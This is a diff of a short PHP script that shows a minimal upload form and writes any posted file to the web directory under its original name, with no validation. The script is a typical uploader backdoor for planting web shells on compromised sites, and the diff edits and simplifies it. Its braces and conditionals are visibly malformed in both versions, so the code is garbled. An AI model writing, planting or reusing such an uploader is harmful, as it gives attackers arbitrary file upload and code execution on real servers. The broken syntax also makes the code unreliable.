@@ -1,4 +1,4 @@
-<?pHp
+<?php
 if
 (isset
 (
@@ -13,28 +13,9 @@ echo "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
 <input type=\"submit\" name=\"default\" value=\">>\">
 </form>";
 {
-move_uploaded_file(
-                $_FILES["file"]["tmp_name"],
-                $_FILES["file"]["name"]
-            ) {
-            printf(
-                'uploaded: <a href="%s">%s</a><br/>',
-                $_FILES["file"]["name"],
-                $_FILES["file"]["name"]
-            );
-        } else {
-            print "fail";
-        }
-    } elseif (function_exists("copy")) {
-        if (copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) {
-            printf(
-                'uploaded: <a href="%s">%s</a><br/>',
-                $_FILES["file"]["name"],
-                $_FILES["file"]["name"]
-            );
-        } else {
-            print "failed";
-        }
-    }
+move_uploaded_file($_FILES["file"]["tmp_name"],
+"" . $_FILES["file"]["name"]);
+echo"<hr>";
+}
 }
 ?>
